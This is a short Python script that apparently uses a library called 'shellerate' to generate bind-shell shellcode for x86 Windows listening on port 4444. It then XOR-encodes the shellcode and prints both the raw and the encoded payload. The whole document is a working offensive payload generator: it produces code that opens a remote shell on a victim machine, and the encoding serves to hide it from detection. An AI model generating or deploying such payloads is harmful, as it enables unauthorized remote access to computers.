from shellerate.encoder.xority import Xority
from shellerate.bind_shellcode import *
#logging.basicConfig(format="%(asctime)s [%(levelname)8s] - %(message)s", level=logging.DEBUG)

b=BindShellcode(4444, 'x86', 'win')
b.generate()
e=Xority(b.shellcode())
print(b.shellcode())
print(e.payload())
